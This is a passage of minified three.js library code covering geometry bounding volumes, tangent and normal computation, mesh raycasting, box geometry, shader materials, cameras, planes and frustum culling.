have NaN values.',this)}computeBoundingSphere(){this.boundingSphere===null&&(this.boundingSphere=new ei);const e=this.attributes.position,t=this.morphAttributes.position;if(e&&e.isGLBufferAttribute){console.error('THREE.BufferGeometry.computeBoundingSphere(): GLBufferAttribute requires a manual bounding sphere. Alternatively set "mesh.frustumCulled" to "false".',this),this.boundingSphere.set(new L,1/0);return}if(e){const n=this.boundingSphere.center;if(bt.setFromBufferAttribute(e),t)for(let s=0,o=t.length;s<o;s++){const a=t[s];oi.setFromBufferAttribute(a),this.morphTargetsRelative?(ot.addVectors(bt.min,oi.min),bt.expandByPoint(ot),ot.addVectors(bt.max,oi.max),bt.expandByPoint(ot)):(bt.expandByPoint(oi.min),bt.expandByPoint(oi.max))}bt.getCenter(n);let r=0;for(let s=0,o=e.count;s<o;s++)ot.fromBufferAttribute(e,s),r=Math.max(r,n.distanceToSquared(ot));if(t)for(let s=0,o=t.length;s<o;s++){const a=t[s],l=this.morphTargetsRelative;for(let d=0,u=a.count;d<u;d++)ot.fromBufferAttribute(a,d),l&&(Fn.fromBufferAttribute(e,d),ot.add(Fn)),r=Math.max(r,n.distanceToSquared(ot))}this.boundingSphere.radius=Math.sqrt(r),isNaN(this.boundingSphere.radius)&&console.error('THREE.BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The "position" attribute is likely to have NaN values.',this)}}computeTangents(){const e=this.index,t=this.attributes;if(e===null||t.position===void 0||t.normal===void 0||t.uv===void 0){console.error("THREE.BufferGeometry: .computeTangents() failed. Missing required attributes (index, position, normal or uv)");return}const n=e.array,r=t.position.array,s=t.normal.array,o=t.uv.array,a=r.length/3;this.hasAttribute("tangent")===!1&&this.setAttribute("tangent",new zt(new Float32Array(4*a),4));const l=this.getAttribute("tangent").array,d=[],u=[];for(let R=0;R<a;R++)d[R]=new L,u[R]=new L;const h=new L,p=new L,m=new L,E=new Be,x=new Be,f=new Be,c=new L,g=new L;function _(R,k,X){h.fromArray(r,R*3),p.fromArray(r,k*3),m.fromArray(r,X*3),E.fromArray(o,R*2),x.fromArray(o,k*2),f.fromArray(o,X*2),p.sub(h),m.sub(h),x.sub(E),f.sub(E);const te=1/(x.x*f.y-f.x*x.y);isFinite(te)&&(c.copy(p).multiplyScalar(f.y).addScaledVector(m,-x.y).multiplyScalar(te),g.copy(m).multiplyScalar(x.x).addScaledVector(p,-f.x).multiplyScalar(te),d[R].add(c),d[k].add(c),d[X].add(c),u[R].add(g),u[k].add(g),u[X].add(g))}let v=this.groups;v.length===0&&(v=[{start:0,count:n.length}]);for(let R=0,k=v.length;R<k;++R){const X=v[R],te=X.start,P=X.count;for(let z=te,W=te+P;z<W;z+=3)_(n[z+0],n[z+1],n[z+2])}const w=new L,M=new L,T=new L,D=new L;function y(R){T.fromArray(s,R*3),D.copy(T);const k=d[R];w.copy(k),w.sub(T.multiplyScalar(T.dot(k))).normalize(),M.crossVectors(D,k);const te=M.dot(u[R])<0?-1:1;l[R*4]=w.x,l[R*4+1]=w.y,l[R*4+2]=w.z,l[R*4+3]=te}for(let R=0,k=v.length;R<k;++R){const X=v[R],te=X.start,P=X.count;for(let z=te,W=te+P;z<W;z+=3)y(n[z+0]),y(n[z+1]),y(n[z+2])}}computeVertexNormals(){const e=this.index,t=this.getAttribute("position");if(t!==void 0){let n=this.getAttribute("normal");if(n===void 0)n=new zt(new Float32Array(t.count*3),3),this.setAttribute("normal",n);else for(let p=0,m=n.count;p<m;p++)n.setXYZ(p,0,0,0);const r=new L,s=new L,o=new L,a=new L,l=new L,d=new L,u=new L,h=new L;if(e)for(let p=0,m=e.count;p<m;p+=3){const E=e.getX(p+0),x=e.getX(p+1),f=e.getX(p+2);r.fromBufferAttribute(t,E),s.fromBufferAttribute(t,x),o.fromBufferAttribute(t,f),u.subVectors(o,s),h.subVectors(r,s),u.cross(h),a.fromBufferAttribute(n,E),l.fromBufferAttribute(n,x),d.fromBufferAttribute(n,f),a.add(u),l.add(u),d.add(u),n.setXYZ(E,a.x,a.y,a.z),n.setXYZ(x,l.x,l.y,l.z),n.setXYZ(f,d.x,d.y,d.z)}else for(let p=0,m=t.count;p<m;p+=3)r.fromBufferAttribute(t,p+0),s.fromBufferAttribute(t,p+1),o.fromBufferAttribute(t,p+2),u.subVectors(o,s),h.subVectors(r,s),u.cross(h),n.setXYZ(p+0,u.x,u.y,u.z),n.setXYZ(p+1,u.x,u.y,u.z),n.setXYZ(p+2,u.x,u.y,u.z);this.normalizeNormals(),n.needsUpdate=!0}}normalizeNormals(){const e=this.attributes.normal;for(let t=0,n=e.count;t<n;t++)ot.fromBufferAttribute(e,t),ot.normalize(),e.setXYZ(t,ot.x,ot.y,ot.z)}toNonIndexed(){function e(a,l){const d=a.array,u=a.itemSize,h=a.normalized,p=new d.constructor(l.length*u);let m=0,E=0;for(let x=0,f=l.length;x<f;x++){a.isInterleavedBufferAttribute?m=l[x]*a.data.stride+a.offset:m=l[x]*u;for(let c=0;c<u;c++)p[E++]=d[m++]}return new zt(p,u,h)}if(this.index===null)return console.warn("THREE.BufferGeometry.toNonIndexed(): BufferGeometry is already non-indexed."),this;const t=new It,n=this.index.array,r=this.attributes;for(const a in r){const l=r[a],d=e(l,n);t.setAttribute(a,d)}const s=this.morphAttributes;for(const a in s){const l=[],d=s[a];for(let u=0,h=d.length;u<h;u++){const p=d[u],m=e(p,n);l.push(m)}t.morphAttributes[a]=l}t.morphTargetsRelative=this.morphTargetsRelative;const o=this.groups;for(let a=0,l=o.length;a<l;a++){const d=o[a];t.addGroup(d.start,d.count,d.materialIndex)}return t}toJSON(){const e={metadata:{version:4.6,type:"BufferGeometry",generator:"BufferGeometry.toJSON"}};if(e.uuid=this.uuid,e.type=this.type,this.name!==""&&(e.name=this.name),Object.keys(this.userData).length>0&&(e.userData=this.userData),this.parameters!==void 0){const l=this.parameters;for(const d in l)l[d]!==void 0&&(e[d]=l[d]);return e}e.data={attributes:{}};const t=this.index;t!==null&&(e.data.index={type:t.array.constructor.name,array:Array.prototype.slice.call(t.array)});const n=this.attributes;for(const l in n){const d=n[l];e.data.attributes[l]=d.toJSON(e.data)}const r={};let s=!1;for(const l in this.morphAttributes){const d=this.morphAttributes[l],u=[];for(let h=0,p=d.length;h<p;h++){const m=d[h];u.push(m.toJSON(e.data))}u.length>0&&(r[l]=u,s=!0)}s&&(e.data.morphAttributes=r,e.data.morphTargetsRelative=this.morphTargetsRelative);const o=this.groups;o.length>0&&(e.data.groups=JSON.parse(JSON.stringify(o)));const a=this.boundingSphere;return a!==null&&(e.data.boundingSphere={center:a.center.toArray(),radius:a.radius}),e}clone(){return new this.constructor().copy(this)}copy(e){this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null;const t={};this.name=e.name;const n=e.index;n!==null&&this.setIndex(n.clone(t));const r=e.attributes;for(const d in r){const u=r[d];this.setAttribute(d,u.clone(t))}const s=e.morphAttributes;for(const d in s){const u=[],h=s[d];for(let p=0,m=h.length;p<m;p++)u.push(h[p].clone(t));this.morphAttributes[d]=u}this.morphTargetsRelative=e.morphTargetsRelative;const o=e.groups;for(let d=0,u=o.length;d<u;d++){const h=o[d];this.addGroup(h.start,h.count,h.materialIndex)}const a=e.boundingBox;a!==null&&(this.boundingBox=a.clone());const l=e.boundingSphere;return l!==null&&(this.boundingSphere=l.clone()),this.drawRange.start=e.drawRange.start,this.drawRange.count=e.drawRange.count,this.userData=e.userData,this}dispose(){this.dispatchEvent({type:"dispose"})}}const fa=new Ze,hn=new ls,Li=new ei,ha=new L,kn=new L,zn=new L,Bn=new L,Dr=new L,Di=new L,Ni=new Be,Oi=new Be,Ui=new Be,ma=new L,_a=new L,ga=new L,Fi=new L,ki=new L;class Ht extends yt{constructor(e=new It,t=new pi){super(),this.isMesh=!0,this.type="Mesh",this.geometry=e,this.material=t,this.updateMorphTargets()}copy(e,t){return super.copy(e,t),e.morphTargetInfluences!==void 0&&(this.morphTargetInfluences=e.morphTargetInfluences.slice()),e.morphTargetDictionary!==void 0&&(this.morphTargetDictionary=Object.assign({},e.morphTargetDictionary)),this.material=Array.isArray(e.material)?e.material.slice():e.material,this.geometry=e.geometry,this}updateMorphTargets(){const t=this.geometry.morphAttributes,n=Object.keys(t);if(n.length>0){const r=t[n[0]];if(r!==void 0){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(let s=0,o=r.length;s<o;s++){const a=r[s].name||String(s);this.morphTargetInfluences.push(0),this.morphTargetDictionary[a]=s}}}}getVertexPosition(e,t){const n=this.geometry,r=n.attributes.position,s=n.morphAttributes.position,o=n.morphTargetsRelative;t.fromBufferAttribute(r,e);const a=this.morphTargetInfluences;if(s&&a){Di.set(0,0,0);for(let l=0,d=s.length;l<d;l++){const u=a[l],h=s[l];u!==0&&(Dr.fromBufferAttribute(h,e),o?Di.addScaledVector(Dr,u):Di.addScaledVector(Dr.sub(t),u))}t.add(Di)}return t}raycast(e,t){const n=this.geometry,r=this.material,s=this.matrixWorld;r!==void 0&&(n.boundingSphere===null&&n.computeBoundingSphere(),Li.copy(n.boundingSphere),Li.applyMatrix4(s),hn.copy(e.ray).recast(e.near),!(Li.containsPoint(hn.origin)===!1&&(hn.intersectSphere(Li,ha)===null||hn.origin.distanceToSquared(ha)>(e.far-e.near)**2))&&(fa.copy(s).invert(),hn.copy(e.ray).applyMatrix4(fa),!(n.boundingBox!==null&&hn.intersectsBox(n.boundingBox)===!1)&&this._computeIntersections(e,t,hn)))}_computeIntersections(e,t,n){let r;const s=this.geometry,o=this.material,a=s.index,l=s.attributes.position,d=s.attributes.uv,u=s.attributes.uv1,h=s.attributes.normal,p=s.groups,m=s.drawRange;if(a!==null)if(Array.isArray(o))for(let E=0,x=p.length;E<x;E++){const f=p[E],c=o[f.materialIndex],g=Math.max(f.start,m.start),_=Math.min(a.count,Math.min(f.start+f.count,m.start+m.count));for(let v=g,w=_;v<w;v+=3){const M=a.getX(v),T=a.getX(v+1),D=a.getX(v+2);r=zi(this,c,e,n,d,u,h,M,T,D),r&&(r.faceIndex=Math.floor(v/3),r.face.materialIndex=f.materialIndex,t.push(r))}}else{const E=Math.max(0,m.start),x=Math.min(a.count,m.start+m.count);for(let f=E,c=x;f<c;f+=3){const g=a.getX(f),_=a.getX(f+1),v=a.getX(f+2);r=zi(this,o,e,n,d,u,h,g,_,v),r&&(r.faceIndex=Math.floor(f/3),t.push(r))}}else if(l!==void 0)if(Array.isArray(o))for(let E=0,x=p.length;E<x;E++){const f=p[E],c=o[f.materialIndex],g=Math.max(f.start,m.start),_=Math.min(l.count,Math.min(f.start+f.count,m.start+m.count));for(let v=g,w=_;v<w;v+=3){const M=v,T=v+1,D=v+2;r=zi(this,c,e,n,d,u,h,M,T,D),r&&(r.faceIndex=Math.floor(v/3),r.face.materialIndex=f.materialIndex,t.push(r))}}else{const E=Math.max(0,m.start),x=Math.min(l.count,m.start+m.count);for(let f=E,c=x;f<c;f+=3){const g=f,_=f+1,v=f+2;r=zi(this,o,e,n,d,u,h,g,_,v),r&&(r.faceIndex=Math.floor(f/3),t.push(r))}}}}function rc(i,e,t,n,r,s,o,a){let l;if(e.side===Et?l=n.intersectTriangle(o,s,r,!0,a):l=n.intersectTriangle(r,s,o,e.side===cn,a),l===null)return null;ki.copy(a),ki.applyMatrix4(i.matrixWorld);const d=t.ray.origin.distanceTo(ki);return d<t.near||d>t.far?null:{distance:d,point:ki.clone(),object:i}}function zi(i,e,t,n,r,s,o,a,l,d){i.getVertexPosition(a,kn),i.getVertexPosition(l,zn),i.getVertexPosition(d,Bn);const u=rc(i,e,t,n,kn,zn,Bn,Fi);if(u){r&&(Ni.fromBufferAttribute(r,a),Oi.fromBufferAttribute(r,l),Ui.fromBufferAttribute(r,d),u.uv=Ot.getInterpolation(Fi,kn,zn,Bn,Ni,Oi,Ui,new Be)),s&&(Ni.fromBufferAttribute(s,a),Oi.fromBufferAttribute(s,l),Ui.fromBufferAttribute(s,d),u.uv1=Ot.getInterpolation(Fi,kn,zn,Bn,Ni,Oi,Ui,new Be),u.uv2=u.uv1),o&&(ma.fromBufferAttribute(o,a),_a.fromBufferAttribute(o,l),ga.fromBufferAttribute(o,d),u.normal=Ot.getInterpolation(Fi,kn,zn,Bn,ma,_a,ga,new L),u.normal.dot(n.direction)>0&&u.normal.multiplyScalar(-1));const h={a,b:l,c:d,normal:new L,materialIndex:0};Ot.getNormal(kn,zn,Bn,h.normal),u.face=h}return u}class vi extends It{constructor(e=1,t=1,n=1,r=1,s=1,o=1){super(),this.type="BoxGeometry",this.parameters={width:e,height:t,depth:n,widthSegments:r,heightSegments:s,depthSegments:o};const a=this;r=Math.floor(r),s=Math.floor(s),o=Math.floor(o);const l=[],d=[],u=[],h=[];let p=0,m=0;E("z","y","x",-1,-1,n,t,e,o,s,0),E("z","y","x",1,-1,n,t,-e,o,s,1),E("x","z","y",1,1,e,n,t,r,o,2),E("x","z","y",1,-1,e,n,-t,r,o,3),E("x","y","z",1,-1,e,t,n,r,s,4),E("x","y","z",-1,-1,e,t,-n,r,s,5),this.setIndex(l),this.setAttribute("position",new dt(d,3)),this.setAttribute("normal",new dt(u,3)),this.setAttribute("uv",new dt(h,2));function E(x,f,c,g,_,v,w,M,T,D,y){const R=v/T,k=w/D,X=v/2,te=w/2,P=M/2,z=T+1,W=D+1;let Y=0,H=0;const V=new L;for(let q=0;q<W;q++){const Q=q*k-te;for(let $=0;$<z;$++){const G=$*R-X;V[x]=G*g,V[f]=Q*_,V[c]=P,d.push(V.x,V.y,V.z),V[x]=0,V[f]=0,V[c]=M>0?1:-1,u.push(V.x,V.y,V.z),h.push($/T),h.push(1-q/D),Y+=1}}for(let q=0;q<D;q++)for(let Q=0;Q<T;Q++){const $=p+Q+z*q,G=p+Q+z*(q+1),j=p+(Q+1)+z*(q+1),re=p+(Q+1)+z*q;l.push($,G,re),l.push(G,j,re),H+=6}a.addGroup(m,H,y),m+=H,p+=Y}}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new vi(e.width,e.height,e.depth,e.widthSegments,e.heightSegments,e.depthSegments)}}function Qn(i){const e={};for(const t in i){e[t]={};for(const n in i[t]){const r=i[t][n];r&&(r.isColor||r.isMatrix3||r.isMatrix4||r.isVector2||r.isVector3||r.isVector4||r.isTexture||r.isQuaternion)?r.isRenderTargetTexture?(console.warn("UniformsUtils: Textures of render targets cannot be cloned via cloneUniforms() or mergeUniforms()."),e[t][n]=null):e[t][n]=r.clone():Array.isArray(r)?e[t][n]=r.slice():e[t][n]=r}}return e}function _t(i){const e={};for(let t=0;t<i.length;t++){const n=Qn(i[t]);for(const r in n)e[r]=n[r]}return e}function sc(i){const e=[];for(let t=0;t<i.length;t++)e.push(i[t].clone());return e}function Eo(i){return i.getRenderTarget()===null?i.outputColorSpace:We.workingColorSpace}const ac={clone:Qn,merge:_t};var oc=`void main() {
	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
}`,lc=`void main() {
	gl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );
}`;class An extends gi{constructor(e){super(),this.isShaderMaterial=!0,this.type="ShaderMaterial",this.defines={},this.uniforms={},this.uniformsGroups=[],this.vertexShader=oc,this.fragmentShader=lc,this.linewidth=1,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.clipping=!1,this.forceSinglePass=!0,this.extensions={derivatives:!1,fragDepth:!1,drawBuffers:!1,shaderTextureLOD:!1,clipCullDistance:!1},this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv1:[0,0]},this.index0AttributeName=void 0,this.uniformsNeedUpdate=!1,this.glslVersion=null,e!==void 0&&this.setValues(e)}copy(e){return super.copy(e),this.fragmentShader=e.fragmentShader,this.vertexShader=e.vertexShader,this.uniforms=Qn(e.uniforms),this.uniformsGroups=sc(e.uniformsGroups),this.defines=Object.assign({},e.defines),this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.fog=e.fog,this.lights=e.lights,this.clipping=e.clipping,this.extensions=Object.assign({},e.extensions),this.glslVersion=e.glslVersion,this}toJSON(e){const t=super.toJSON(e);t.glslVersion=this.glslVersion,t.uniforms={};for(const r in this.uniforms){const o=this.uniforms[r].value;o&&o.isTexture?t.uniforms[r]={type:"t",value:o.toJSON(e).uuid}:o&&o.isColor?t.uniforms[r]={type:"c",value:o.getHex()}:o&&o.isVector2?t.uniforms[r]={type:"v2",value:o.toArray()}:o&&o.isVector3?t.uniforms[r]={type:"v3",value:o.toArray()}:o&&o.isVector4?t.uniforms[r]={type:"v4",value:o.toArray()}:o&&o.isMatrix3?t.uniforms[r]={type:"m3",value:o.toArray()}:o&&o.isMatrix4?t.uniforms[r]={type:"m4",value:o.toArray()}:t.uniforms[r]={value:o}}Object.keys(this.defines).length>0&&(t.defines=this.defines),t.vertexShader=this.vertexShader,t.fragmentShader=this.fragmentShader,t.lights=this.lights,t.clipping=this.clipping;const n={};for(const r in this.extensions)this.extensions[r]===!0&&(n[r]=!0);return Object.keys(n).length>0&&(t.extensions=n),t}}class yo extends yt{constructor(){super(),this.isCamera=!0,this.type="Camera",this.matrixWorldInverse=new Ze,this.projectionMatrix=new Ze,this.projectionMatrixInverse=new Ze,this.coordinateSystem=$t}copy(e,t){return super.copy(e,t),this.matrixWorldInverse.copy(e.matrixWorldInverse),this.projectionMatrix.copy(e.projectionMatrix),this.projectionMatrixInverse.copy(e.projectionMatrixInverse),this.coordinateSystem=e.coordinateSystem,this}getWorldDirection(e){return super.getWorldDirection(e).negate()}updateMatrixWorld(e){super.updateMatrixWorld(e),this.matrixWorldInverse.copy(this.matrixWorld).invert()}updateWorldMatrix(e,t){super.updateWorldMatrix(e,t),this.matrixWorldInverse.copy(this.matrixWorld).invert()}clone(){return new this.constructor().copy(this)}}class Ct extends yo{constructor(e=50,t=1,n=.1,r=2e3){super(),this.isPerspectiveCamera=!0,this.type="PerspectiveCamera",this.fov=e,this.zoom=1,this.near=n,this.far=r,this.focus=10,this.aspect=t,this.view=null,this.filmGauge=35,this.filmOffset=0,this.updateProjectionMatrix()}copy(e,t){return super.copy(e,t),this.fov=e.fov,this.zoom=e.zoom,this.near=e.near,this.far=e.far,this.focus=e.focus,this.aspect=e.aspect,this.view=e.view===null?null:Object.assign({},e.view),this.filmGauge=e.filmGauge,this.filmOffset=e.filmOffset,this}setFocalLength(e){const t=.5*this.getFilmHeight()/e;this.fov=es*2*Math.atan(t),this.updateProjectionMatrix()}getFocalLength(){const e=Math.tan(_r*.5*this.fov);return .5*this.getFilmHeight()/e}getEffectiveFOV(){return es*2*Math.atan(Math.tan(_r*.5*this.fov)/this.zoom)}getFilmWidth(){return this.filmGauge*Math.min(this.aspect,1)}getFilmHeight(){return this.filmGauge/Math.max(this.aspect,1)}setViewOffset(e,t,n,r,s,o){this.aspect=e/t,this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=t,this.view.offsetX=n,this.view.offsetY=r,this.view.width=s,this.view.height=o,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const e=this.near;let t=e*Math.tan(_r*.5*this.fov)/this.zoom,n=2*t,r=this.aspect*n,s=-.5*r;const o=this.view;if(this.view!==null&&this.view.enabled){const l=o.fullWidth,d=o.fullHeight;s+=o.offsetX*r/l,t-=o.offsetY*n/d,r*=o.width/l,n*=o.height/d}const a=this.filmOffset;a!==0&&(s+=e*a/this.getFilmWidth()),this.projectionMatrix.makePerspective(s,s+r,t,t-n,e,this.far,this.coordinateSystem),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(e){const t=super.toJSON(e);return t.object.fov=this.fov,t.object.zoom=this.zoom,t.object.near=this.near,t.object.far=this.far,t.object.focus=this.focus,t.object.aspect=this.aspect,this.view!==null&&(t.object.view=Object.assign({},this.view)),t.object.filmGauge=this.filmGauge,t.object.filmOffset=this.filmOffset,t}}const Gn=-90,Hn=1;class cc extends yt{constructor(e,t,n){super(),this.type="CubeCamera",this.renderTarget=n,this.coordinateSystem=null,this.activeMipmapLevel=0;const r=new Ct(Gn,Hn,e,t);r.layers=this.layers,this.add(r);const s=new Ct(Gn,Hn,e,t);s.layers=this.layers,this.add(s);const o=new Ct(Gn,Hn,e,t);o.layers=this.layers,this.add(o);const a=new Ct(Gn,Hn,e,t);a.layers=this.layers,this.add(a);const l=new Ct(Gn,Hn,e,t);l.layers=this.layers,this.add(l);const d=new Ct(Gn,Hn,e,t);d.layers=this.layers,this.add(d)}updateCoordinateSystem(){const e=this.coordinateSystem,t=this.children.concat(),[n,r,s,o,a,l]=t;for(const d of t)this.remove(d);if(e===$t)n.up.set(0,1,0),n.lookAt(1,0,0),r.up.set(0,1,0),r.lookAt(-1,0,0),s.up.set(0,0,-1),s.lookAt(0,1,0),o.up.set(0,0,1),o.lookAt(0,-1,0),a.up.set(0,1,0),a.lookAt(0,0,1),l.up.set(0,1,0),l.lookAt(0,0,-1);else if(e===Zi)n.up.set(0,-1,0),n.lookAt(-1,0,0),r.up.set(0,-1,0),r.lookAt(1,0,0),s.up.set(0,0,1),s.lookAt(0,1,0),o.up.set(0,0,-1),o.lookAt(0,-1,0),a.up.set(0,-1,0),a.lookAt(0,0,1),l.up.set(0,-1,0),l.lookAt(0,0,-1);else throw new Error("THREE.CubeCamera.updateCoordinateSystem(): Invalid coordinate system: "+e);for(const d of t)this.add(d),d.updateMatrixWorld()}update(e,t){this.parent===null&&this.updateMatrixWorld();const{renderTarget:n,activeMipmapLevel:r}=this;this.coordinateSystem!==e.coordinateSystem&&(this.coordinateSystem=e.coordinateSystem,this.updateCoordinateSystem());const[s,o,a,l,d,u]=this.children,h=e.getRenderTarget(),p=e.getActiveCubeFace(),m=e.getActiveMipmapLevel(),E=e.xr.enabled;e.xr.enabled=!1;const x=n.texture.generateMipmaps;n.texture.generateMipmaps=!1,e.setRenderTarget(n,0,r),e.render(t,s),e.setRenderTarget(n,1,r),e.render(t,o),e.setRenderTarget(n,2,r),e.render(t,a),e.setRenderTarget(n,3,r),e.render(t,l),e.setRenderTarget(n,4,r),e.render(t,d),n.texture.generateMipmaps=x,e.setRenderTarget(n,5,r),e.render(t,u),e.setRenderTarget(h,p,m),e.xr.enabled=E,n.texture.needsPMREMUpdate=!0}}class So extends Tt{constructor(e,t,n,r,s,o,a,l,d,u){e=e!==void 0?e:[],t=t!==void 0?t:Kn,super(e,t,n,r,s,o,a,l,d,u),this.isCubeTexture=!0,this.flipY=!1}get images(){return this.image}set images(e){this.image=e}}class dc extends Tn{constructor(e=1,t={}){super(e,e,t),this.isWebGLCubeRenderTarget=!0;const n={width:e,height:e,depth:1},r=[n,n,n,n,n,n];t.encoding!==void 0&&(ui("THREE.WebGLCubeRenderTarget: option.encoding has been replaced by option.colorSpace."),t.colorSpace=t.encoding===Mn?lt:Pt),this.texture=new So(r,t.mapping,t.wrapS,t.wrapT,t.magFilter,t.minFilter,t.format,t.type,t.anisotropy,t.colorSpace),this.texture.isRenderTargetTexture=!0,this.texture.generateMipmaps=t.generateMipmaps!==void 0?t.generateMipmaps:!1,this.texture.minFilter=t.minFilter!==void 0?t.minFilter:wt}fromEquirectangularTexture(e,t){this.texture.type=t.type,this.texture.colorSpace=t.colorSpace,this.texture.generateMipmaps=t.generateMipmaps,this.texture.minFilter=t.minFilter,this.texture.magFilter=t.magFilter;const n={uniforms:{tEquirect:{value:null}},vertexShader:`

				varying vec3 vWorldDirection;

				vec3 transformDirection( in vec3 dir, in mat4 matrix ) {

					return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );

				}

				void main() {

					vWorldDirection = transformDirection( position, modelMatrix );

					#include <begin_vertex>
					#include <project_vertex>

				}
			`,fragmentShader:`

				uniform sampler2D tEquirect;

				varying vec3 vWorldDirection;

				#include <common>

				void main() {

					vec3 direction = normalize( vWorldDirection );

					vec2 sampleUV = equirectUv( direction );

					gl_FragColor = texture2D( tEquirect, sampleUV );

				}
			`},r=new vi(5,5,5),s=new An({name:"CubemapFromEquirect",uniforms:Qn(n.uniforms),vertexShader:n.vertexShader,fragmentShader:n.fragmentShader,side:Et,blending:an});s.uniforms.tEquirect.value=t;const o=new Ht(r,s),a=t.minFilter;return t.minFilter===fi&&(t.minFilter=wt),new cc(1,10,this).update(e,o),t.minFilter=a,o.geometry.dispose(),o.material.dispose(),this}clear(e,t,n,r){const s=e.getRenderTarget();for(let o=0;o<6;o++)e.setRenderTarget(this,o),e.clear(t,n,r);e.setRenderTarget(s)}}const Nr=new L,uc=new L,pc=new ke;class _n{constructor(e=new L(1,0,0),t=0){this.isPlane=!0,this.normal=e,this.constant=t}set(e,t){return this.normal.copy(e),this.constant=t,this}setComponents(e,t,n,r){return this.normal.set(e,t,n),this.constant=r,this}setFromNormalAndCoplanarPoint(e,t){return this.normal.copy(e),this.constant=-t.dot(this.normal),this}setFromCoplanarPoints(e,t,n){const r=Nr.subVectors(n,t).cross(uc.subVectors(e,t)).normalize();return this.setFromNormalAndCoplanarPoint(r,e),this}copy(e){return this.normal.copy(e.normal),this.constant=e.constant,this}normalize(){const e=1/this.normal.length();return this.normal.multiplyScalar(e),this.constant*=e,this}negate(){return this.constant*=-1,this.normal.negate(),this}distanceToPoint(e){return this.normal.dot(e)+this.constant}distanceToSphere(e){return this.distanceToPoint(e.center)-e.radius}projectPoint(e,t){return t.copy(e).addScaledVector(this.normal,-this.distanceToPoint(e))}intersectLine(e,t){const n=e.delta(Nr),r=this.normal.dot(n);if(r===0)return this.distanceToPoint(e.start)===0?t.copy(e.start):null;const s=-(e.start.dot(this.normal)+this.constant)/r;return s<0||s>1?null:t.copy(e.start).addScaledVector(n,s)}intersectsLine(e){const t=this.distanceToPoint(e.start),n=this.distanceToPoint(e.end);return t<0&&n>0||n<0&&t>0}intersectsBox(e){return e.intersectsPlane(this)}intersectsSphere(e){return e.intersectsPlane(this)}coplanarPoint(e){return e.copy(this.normal).multiplyScalar(-this.constant)}applyMatrix4(e,t){const n=t||pc.getNormalMatrix(e),r=this.coplanarPoint(Nr).applyMatrix4(e),s=this.normal.applyMatrix3(n).normalize();return this.constant=-r.dot(s),this}translate(e){return this.constant-=e.dot(this.normal),this}equals(e){return e.normal.equals(this.normal)&&e.constant===this.constant}clone(){return new this.constructor().copy(this)}}const mn=new ei,Bi=new L;class Mo{constructor(e=new _n,t=new _n,n=new _n,r=new _n,s=new _n,o=new _n){this.planes=[e,t,n,r,s,o]}set(e,t,n,r,s,o){const a=this.planes;return a[0].copy(e),a[1].copy(t),a[2].copy(n),a[3].copy(r),a[4].copy(s),a[5].copy(o),this}copy(e){const t=this.planes;for(let n=0;n<6;n++)t[n].copy(e.planes[n]);return this}setFromProjectionMatrix(e,t=$t){const n=this.planes,r=e.elements,s=r[0],o=r[1],a=r[2],l=r[3],d=r[4],u=r[5],h=r[6],p=r[7],m=r[8],E=r[9],x=r[10],f=r[11],c=r[12],g=r[13],_=r[14],v=r[15];if(n[0].setComponents(l-s,p-d,f-m,v-c).normalize(),n[1].setComponents(l+s,p+d,f+m,v+c).normalize(),n[2].setComponents(l+o,p+u,f+E,v+g).normalize(),n[3].setComponents(l-o,p-u,f-E,v-g).normalize(),n[4].setComponents(l-a,p-h,f-x,v-_).normalize(),t===$t)n[5].setComponents(l+a,p+h,f+x,v+_).normalize();else if(t===Zi)n[5].setComponents(a,h,x,_).normalize();else throw new Error("THREE.Frustum.setFromProjectionMatrix(): Invalid coordinate system: "+t);return this}intersectsObject(e){if(e.boundingSphere!==void 0)e.boundingSphere===null&&e.computeBoundingSphere(),mn.copy(e.boundingSphere).applyMatrix4(e.matrixWorld);else{const t=e.geometry;t.boundingSphere===null&&t.computeBoundingSphere(),mn.copy(t.boundingSphere).applyMatrix4(e.matrixWorld)}return this.intersectsSphere(mn)}intersectsSprite(e){return mn.center.set(0,0,0),mn.radius=.7071067811865476,mn.applyMatrix4(e.matrixWorld),this.intersectsSphere(mn)}intersectsSphere(e){const t=this.planes,n=e.center,r=-e.radius;for(let s=0;s<6;s++)if(t[s].distanceToPoint(n)<r)return!1;return!0}intersectsBox(e){const t=this.planes;for(let n=0;n<6;n++){const r=t[n];if(Bi.x=r.normal.x>0?e.max.x:e.min.x,Bi.y=r.normal.y>0?e.max.y:e.min.y,Bi.z=r.normal.z>0?e.max.z:e.min.z,r.distanceToPoint(Bi)<0)return!1}return!0}containsPoint(e){const t=this.planes;for(let n=0;n<6;n++)if(t[n].distanceToPoint(e)<0)return!1;return!0}clone(){return new this.constructor().copy(this)}}function bo(){let i=null,e=!1,t=null,n=null;function r(s,o){t(s,o),n=i.requestAnimationFrame(r)}return{start:function(){e!==!0&&t!==null&&(n=i.requestAnimationFrame(r),e=!0)},stop:function(){i.cancelAnimationFrame(n),e=!1},setAnimationLoop:function(s){t=s},setContext:function(s){i=s}}}function fc(i,e){const t=e.isWebGL2,n=new WeakMap;function r(d,u){const h=d.array,p=d.usage,m=h.byteLength,E=i.createBuffer();i.bindBuffer(u,E),i.bufferData(u,h,p),d.onUploadCallback();let x;if(h instanceof Float32Array)x=i.FLOAT;else if(h instanceof Uint16Array)if(d.isFloat16BufferAttribute)if(t)x=i.HALF_FLOAT;else throw new Error("THREE.WebGLAttributes: Usage of Float16BufferAttribute requires WebGL2.");else x=i.UNSIGNED_SHORT;else if(h instanceof Int16Array)x=i.SHORT;else if(h instanceof Uint32Array)x=i.UNSIGNED_INT;else if(h instanceof Int32Array)x=i.INT;else if(h instanceof Int8Array)x=i.BYTE;else if(h instanceof 